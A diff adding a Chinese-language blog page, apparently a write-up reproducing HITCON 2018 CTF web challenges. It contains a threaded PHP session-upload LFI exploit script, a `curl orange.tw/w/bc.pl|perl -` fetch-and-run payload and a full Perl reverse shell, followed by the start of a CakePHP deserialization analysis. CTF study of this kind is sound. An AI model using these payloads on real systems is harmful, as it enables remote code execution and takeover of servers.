@@ -1,0 +1,1853 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="hitcon-复现 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>hitcon-复现 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">hitcon-复现</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            hitcon-复现
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,919</span> / Reading time: <span class="post-count">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/23</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="One-Line-PHP-Challenge"><a href="#One-Line-PHP-Challenge" class="headerlink" title="One Line PHP Challenge"></a>One Line PHP Challenge</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	($_=@$_GET[&apos;orange&apos;]) &amp;&amp; @substr(file($_)[0], 0, 6) === &quot;@&lt;?php&quot; ? include($_) : highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>参考链接: <a href="https://hackmd.io/s/B1A2JIjjm" rel="external nofollow" target="_blank">https://hackmd.io/s/B1A2JIjjm</a></p>
+<p>考点: session.upload + lfi</p>
+<h3 id="include-策略"><a href="#include-策略" class="headerlink" title="include 策略"></a>include 策略</h3><p>PHP配置中，<code>allow_url_include</code>一般为<code>Off</code>，所以RFI不可取。由于最新版本Apache2和PHP的加固，包含<code>/proc/self/environs</code>或者<code>/var/log/apache2/access.log</code>也行，同时也没有办法泄露PHP上传的文件的<code>temporary filename</code>,所以<code>LFI WITH PHPINFO() ASSISTANCE</code>无效。</p>
+<h4 id="session-策略"><a href="#session-策略" class="headerlink" title="session 策略"></a>session 策略</h4><p>session.upload: 在ubuntu中，以apt-get安装的php，<em>session.upload</em> 会默认开启。</p>
+<p><strong>The PHP check the value <code>session.auto_start</code> or function <code>session_start()</code> to know whether it need to process session on current request or not. Unfortunately, the default value of <code>session.auto_start</code> is <code>Off</code>. However, it’s interesting that if you provide the <code>PHP_SESSION_UPLOAD_PROGRESS</code> in multipart POST data. The PHP will enable the session for you :P</strong></p>
+<p>PHP会检查<code>session.auto_start</code>或者<code>session_start()</code>方法来判断是否需要在请求中处理<code>session</code>。不幸的是<code>session.auto_start</code>的值默认是<code>off</code>。但是，有意思的是，当我们在<code>multipart POST</code>中提供<code>PHP_SESSION_UPLOAD_PROGRESS</code>的时候，PHP将会开启<code>session</code>。</p>
+<p>测试如下:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tiandiwuji@tiandiwuji:~$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'</span><br><span class="line">tiandiwuji@tiandiwuji:~$ sudo ls -al /var/lib/php/sessions/</span><br><span class="line">total 8</span><br><span class="line">drwx-wx-wt 2 root root 4096 Jan 30  2018 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Oct 23 11:08 ..</span><br><span class="line">tiandiwuji@tiandiwuji:~$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -d 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'</span><br><span class="line">tiandiwuji@tiandiwuji:~$ sudo ls -al /var/lib/php/sessions/</span><br><span class="line">total 8</span><br><span class="line">drwx-wx-wt 2 root root 4096 Jan 30  2018 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Oct 23 11:08 ..</span><br><span class="line">tiandiwuji@tiandiwuji:~$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F 'file=@/etc/passwd'</span><br><span class="line">tiandiwuji@tiandiwuji:~$ sudo ls -l /var/lib/php/sessions/</span><br><span class="line">total 0</span><br><span class="line">-rw------- 1 www-data www-data 0 Oct 24 03:36 sess_iamorange</span><br></pre></td></tr></table></figure>
+<h3 id="cleanup-策略"><a href="#cleanup-策略" class="headerlink" title="cleanup 策略"></a>cleanup 策略</h3><p>尽管互联网上大部分文档都建议将<code>session.upload_progress.cleanup</code>值设为<code>Off</code>方便调试，但是，该值在PHP中默认为<code>On</code>，也就是说session中保存的上传进度将会被尽快清理干净。</p>
+<p>这里有两个解决方法:</p>
+<ul>
+<li>条件竞争</li>
+<li>上传超大的文件，保证短时间内上传进度不被删除</li>
+</ul>
+<h3 id="Prefix（-lt-php）解决"><a href="#Prefix（-lt-php）解决" class="headerlink" title="Prefix（@&lt;?php）解决"></a>Prefix（@&lt;?php）解决</h3><h3 id="方法一-orange"><a href="#方法一-orange" class="headerlink" title="方法一@orange:"></a>方法一@orange:</h3><p>由于<code>session.upload_progress_prefix</code>的默认为<code>upload_progress_</code>，所以session文件的开头将默认为<code>upload_progress_</code>。</p>
+<p>为了能够让字符串匹配<code>@&lt;?php</code>，可以采用PHP strem filter来绕过前缀检查。</p>
+<p><strong>base64_decode</strong>: 该方法会忽略无效的字符，测试如下:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo base64_decode("upload_progress_ZZVVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy");</span><br><span class="line">hik</span><br><span class="line">޲YUUR3L2NHaHdJR0JqZFhKc0lHOXlZVzVuWlM1MGR5OTNMMkpqTG5Cc2ZIQmxjbXdnTFdBN1B6NHZMeTh2THk4dkx5OHZMeTh2</span><br><span class="line">php &gt; echo base64_decode(base64_decode("upload_progress_ZZVVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy"));</span><br><span class="line">)↑QDw/cGhwIGBjdXJsIG9yYW5nZS50dy93L2JjLnBsfHBlcmwgLWA7Pz4vLy8vLy8vLy8vLy8v</span><br><span class="line">php &gt; echo base64_decode(base64_decode(base64_decode("upload_progress_ZZVVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy"))); </span><br><span class="line">@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;/////////////</span><br><span class="line">@&lt;?php echo `ls -al`;echo "hetaonihao";?&gt;/////////////</span><br></pre></td></tr></table></figure>
+<p>本地测试:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo base64_encode(base64_encode(base64_encode(&quot;@&lt;?php echo `ls -al`;?&gt;//&quot;)));</span><br><span class="line">VVVSM0wyTkhhSGRKUjFacVlVYzRaMWxIZUhwSlF6Rm9Za2RCTjFCNk5IWk1kejA5</span><br></pre></td></tr></table></figure>
+<p>最终脚本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">from base64 import b64encode</span><br><span class="line">from random import sample, randint</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"></span><br><span class="line">HOST = &apos;http://54.250.246.238/&apos;</span><br><span class="line">sess_name = &apos;iamorange&apos;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;Connection&apos;: &apos;close&apos;, </span><br><span class="line">    &apos;Cookie&apos;: &apos;PHPSESSID=&apos; + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#payload = &apos;@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;&apos;</span><br><span class="line"></span><br><span class="line">#while 1:</span><br><span class="line">#    junk = &apos;&apos;.join(sample(string.ascii_letters, randint(8, 16)))</span><br><span class="line">#    x = b64encode(payload + junk)</span><br><span class="line">#    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">#    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">#    if &apos;=&apos; not in x and &apos;=&apos; not in xx and &apos;=&apos; not in xxx:</span><br><span class="line">#        payload = xxx</span><br><span class="line">#        print payload</span><br><span class="line">#        break</span><br><span class="line"></span><br><span class="line"># 我的修改，不管payload怎么变，长度如果和下边这个payload一样长，那么就不需要在填充字符串了，否则的话，需要在payload后边填充字符串，保证每次b64encode该payload之后，不会出现`=`，如果出现的话，会有问题 </span><br><span class="line">payload = &apos;@&lt;?php echo `ls -al`;echo &quot;hetaonihao&quot;;?&gt;/////////////&apos;</span><br><span class="line"></span><br><span class="line">payload = b64encode(b64encode(b64encode(payload)))</span><br><span class="line">print payload</span><br><span class="line"></span><br><span class="line">def runner1(i):</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;PHP_SESSION_UPLOAD_PROGRESS&apos;: &apos;ZZ&apos; + payload + &apos;Z&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    while 1:</span><br><span class="line">        fp = open(&apos;/etc/passwd&apos;, &apos;rb&apos;)</span><br><span class="line">        r = requests.post(HOST, files=&#123;&apos;f&apos;: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line">def runner2(i):</span><br><span class="line">    filename = &apos;/var/lib/php/sessions/sess_&apos; + sess_name</span><br><span class="line">    filename = &apos;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&apos; % filename</span><br><span class="line">    # print filename</span><br><span class="line">    while 1:</span><br><span class="line">        url = &apos;%s?orange=%s&apos; % (HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        if c and &apos;orange&apos; not in c:</span><br><span class="line">            print [c]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &apos;1&apos;:</span><br><span class="line">    runner = runner1</span><br><span class="line">else:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(32)</span><br><span class="line">result = pool.map_async( runner, range(32) ).get(0xffff)</span><br><span class="line"></span><br><span class="line"># 开启两个窗口</span><br><span class="line"># python solve.py 1</span><br><span class="line"># python solve.py 2</span><br></pre></td></tr></table></figure>
+<h3 id="附-orange-tw-w-bc-pl"><a href="#附-orange-tw-w-bc-pl" class="headerlink" title="附: orange.tw/w/bc.pl"></a>附: orange.tw/w/bc.pl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/perl</span><br><span class="line">use Socket;</span><br><span class="line">$cmd= &quot;lynx&quot;;</span><br><span class="line">$system= &apos;echo &quot;`uname -a`&quot;;echo &quot;`id`&quot;;/bin/sh&apos;;</span><br><span class="line">$0=$cmd;</span><br><span class="line">$target=&quot;orange.tw&quot;;</span><br><span class="line">$port=12345;</span><br><span class="line">$iaddr=inet_aton($target) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">$paddr=sockaddr_in($port, $iaddr) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">$proto=getprotobyname(&apos;tcp&apos;);</span><br><span class="line">socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">connect(SOCKET, $paddr) || die(&quot;Error: $!\n&quot;);</span><br><span class="line">open(STDIN, &quot;&gt;&amp;SOCKET&quot;);</span><br><span class="line">open(STDOUT, &quot;&gt;&amp;SOCKET&quot;);</span><br><span class="line">open(STDERR, &quot;&gt;&amp;SOCKET&quot;);</span><br><span class="line">system($system);</span><br><span class="line">close(STDIN);</span><br><span class="line">close(STDOUT);</span><br><span class="line">close(STDERR);</span><br></pre></td></tr></table></figure>
+<h2 id="baby-cake"><a href="#baby-cake" class="headerlink" title="baby cake"></a>baby cake</h2><h3 id="查看composer-json"><a href="#查看composer-json" class="headerlink" title="查看composer.json"></a>查看composer.json</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;php&quot;: &quot;&gt;=5.6&quot;,</span><br><span class="line">&quot;cakephp/cakephp&quot;: &quot;3.5.*&quot;,</span><br><span class="line">&quot;cakephp/migrations&quot;: &quot;^1.0&quot;,</span><br><span class="line">&quot;cakephp/plugin-installer&quot;: &quot;^1.0&quot;,</span><br><span class="line">&quot;josegonzalez/dotenv&quot;: &quot;2.*&quot;,</span><br><span class="line">&quot;mobiledetect/mobiledetectlib&quot;: &quot;2.*&quot;, </span><br><span class="line">&quot;monolog/monolog&quot;: &quot;^1.23&quot;</span><br></pre></td></tr></table></figure>
+<p><code>monolog</code>版本过低，存在反序列化rce漏洞。</p>
+<h3 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h3><h4 id="针对header的序列化以及反序列化"><a href="#针对header的序列化以及反序列化" class="headerlink" title="针对header的序列化以及反序列化"></a>针对header的序列化以及反序列化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">private function cache_set($key, $response) &#123;</span><br><span class="line">        $cache_dir = $this-&gt;_cache_dir($key);</span><br><span class="line">        if ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, 0700, true);</span><br><span class="line">            file_put_contents($cache_dir . &quot;body.cache&quot;, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . &quot;headers.cache&quot;, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function cache_get($key) &#123;</span><br><span class="line">        $cache_dir = $this-&gt;_cache_dir($key);</span><br><span class="line">        if (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . &quot;/body.cache&quot;);</span><br><span class="line">            $headers = file_get_contents($cache_dir . &quot;/headers.cache&quot;);</span><br><span class="line">            </span><br><span class="line">            $body = &quot;&lt;!-- from cache --&gt;\n&quot; . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            return new DymmyResponse($headers, $body);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>由于<code>$headers</code>变量是一个数组，所以在序列化之后，在反序列化，仍然得到的是一个数组，至于具体内容则不会触发反序列化，因而不存在漏洞。</p>
+<h4 id="body"><a href="#body" class="headerlink" title="body"></a>body</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ($method == &apos;get&apos;) &#123;</span><br><span class="line">	$response = $this-&gt;cache_get($key);</span><br><span class="line">	if (!$response) &#123;</span><br><span class="line">		$response = $this-&gt;httpclient($method, $url, $headers, null);</span><br><span class="line">		$this-&gt;cache_set($key, $response);                </span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">	$response = $this-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看httpclient方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private function httpclient($method, $url, $headers, $data) &#123;</span><br><span class="line">        $options = [</span><br><span class="line">            &apos;headers&apos; =&gt; $headers, </span><br><span class="line">            &apos;timeout&apos; =&gt; 10</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $http = new Client();</span><br><span class="line">        return $http-&gt;$method($url, $data, $options);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
